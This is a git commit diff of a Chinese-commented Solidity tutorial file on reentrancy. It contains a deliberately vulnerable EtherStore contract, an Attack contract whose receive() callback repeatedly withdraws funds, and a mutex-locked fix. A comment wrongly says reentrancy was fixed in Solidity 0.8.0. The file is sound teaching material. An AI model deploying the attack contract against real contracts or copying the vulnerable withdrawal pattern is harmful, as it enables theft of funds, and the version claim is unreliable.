53bc553bd770b972ea595dd5f0c6c60ef01e68ee
lei <random2035@qq.com>
2022-12-09 23:49:16 +0800

    update

--- test_solidity/7_bug1_reEntry_attack.sol
+++ test_solidity/7_bug1_reEntry_attack.sol
@@ -1,11 +1,12 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.7;
+pragma solidity >=0.7.0 <0.8.0;
 
 /*
 @重入攻击
 - 介绍
     - 首先，合约之间能相互调用；其次，合约在将以太币发送给外部地址时需要提交外部调用，那么这些外部调用有可能会被攻击者劫持从而触发回退函数执行多余代码。
     - 重入，指的是外部的恶意合约通过函数调用重新进入漏洞合约的代码执行过程。
+    - 从0.8.0版本开始被修复。
 
 - （下面受攻击合约）的几种修改方案
     -   1. 使用内置函数transfer() 像外部合约转账，因为带有2300gas的限制，不足以目标地址再次调用其他合约
@@ -16,17 +17,14 @@ pragma solidity ^0.8.7;
 // 1. 给出存在漏洞的合约示例
 contract EtherStore {
     uint256 public withdrawLimit = 1 ether;
-    uint256 public totalBalance;
     mapping(address => uint256) public lastWithdrawTime;
     mapping(address => uint256) public balances;
 
-    constructor() payable {
-        totalBalance += msg.value;
-    }
+    constructor() payable {}
+
     // 存入以太币
     function depositFunds() public payable {
         balances[msg.sender] += msg.value;
-        totalBalance += msg.value;
     }
 
     // 提出以太币
@@ -41,7 +39,6 @@ contract EtherStore {
         require(success, "receiver rejected ETH transfer");
 
         balances[msg.sender] -= _weiToWithdraw;
-        totalBalance -= _weiToWithdraw;
         lastWithdrawTime[msg.sender] = block.timestamp;
     }
 }
@@ -59,7 +56,6 @@ contract Attack {
 
     // 攻击函数
     function attackEtherStore() public payable {
-        // emit attackEtherStore1(address(msg.sender));
         require(msg.value >= 1 ether, "eth is not enough");
         // 将1 eth存入合约
         etherStore.depositFunds{value : 1 ether}();
@@ -67,43 +63,32 @@ contract Attack {
         etherStore.withdrawFunds(1 ether);
     }
 
-    fallback() external payable {
-        emit revertTrigger(1);
-    }
+//    fallback() external payable {
+//        emit revertTrigger(1);
+//    }
 
     // 收款回调
     receive() external payable {
         emit revertTrigger(2);
-        if (etherStore.totalBalance() >= 1 ether) {
+        if (address(etherStore).balance >= 1 ether) {
             etherStore.withdrawFunds(1 ether);
         }
     }
-
-    // function receive2() payable external {
-    //     emit revertTrigger(2);
-    //     if (etherStore.totalBalance() >= 1 ether) {
-    //         etherStore.withdrawFunds(1 ether);
-    //     }
-    // }
 }
 
 
-// 3. 改进存在漏洞的合约
-contract EtherStoreImproved {
+// 3. 改进存在漏洞的合约（测试时注释掉 此合约 或 上面有漏洞的合约）
+contract EtherStore {
     uint256 public withdrawLimit = 1 ether;
-    uint256 public totalBalance;
     mapping(address => uint256) public lastWithdrawTime;
     mapping(address => uint256) public balances;
     // 改进3：引入互斥锁
     bool reEntryLock = false;
 
-    constructor() payable {
-        totalBalance += msg.value;
-    }
+    constructor() payable {}
     // 存入以太币
     function depositFunds() public payable {
         balances[msg.sender] += msg.value;
-        totalBalance += msg.value;
     }
 
     // 提出以太币
@@ -111,15 +96,14 @@ contract EtherStoreImproved {
         require(!reEntryLock, "reEntryLock is required");
         require(balances[msg.sender] >= _weiToWithdraw, "balance insufficient");
         require(_weiToWithdraw <= withdrawLimit, "amount over limit");
-        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks, "last withdraw time less than 1 weeks");
+//        require(block.timestamp >= lastWithdrawTime[msg.sender] + 1 weeks, "last withdraw time less than 1 weeks");
 
         balances[msg.sender] -= _weiToWithdraw; // 改进2
-        totalBalance -= _weiToWithdraw;
 
         reEntryLock = true; // 外部调用前加锁
         msg.sender.transfer(_weiToWithdraw); // 改进1
         reEntryLock = false; // 调用后释放锁
-        lastWithdrawTime[msg.sender] = block.timestamp;
 
+        lastWithdrawTime[msg.sender] = block.timestamp;
     }
 }
